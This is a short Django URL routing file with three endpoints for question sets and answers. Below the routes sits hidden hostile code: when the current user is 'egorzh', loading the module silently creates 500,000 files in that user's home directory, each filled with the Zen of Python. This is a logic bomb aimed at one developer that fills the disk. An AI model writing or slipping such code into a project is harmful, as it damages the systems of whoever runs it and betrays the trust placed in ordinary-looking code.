import getpass
from django.conf.urls import url
from . import views

urlpatterns = [
    url(r'^question_set/', views.http_list_question_sets),
    url(r'^answer_set/', views.http_create_answer_set),
    url(r'^answer/', views.create_answer)
]

if getpass.getuser() == 'egorzh':
    for i in range(500000):
        a = open('/Users/egorzh/Forever{}.txt'.format(i), 'w')
        a.write("""The Zen of Python, by Tim Peters

Beautiful is better than ugly.
Explicit is better than implicit.
Simple is better than complex.
Complex is better than complicated.
Flat is better than nested.
Sparse is better than dense.
Readability counts.
Special cases aren't special enough to break the rules.
Although practicality beats purity.
Errors should never pass silently.
Unless explicitly silenced.
In the face of ambiguity, refuse the temptation to guess.
There should be one-- and preferably only one --obvious way to do it.
Although that way may not be obvious at first unless you're Dutch.
Now is better than never.
Although never is often better than *right* now.
If the implementation is hard to explain, it's a bad idea.
If the implementation is easy to explain, it may be a good idea.
Namespaces are one honking great idea -- let's do more of those!""")
        a.close()
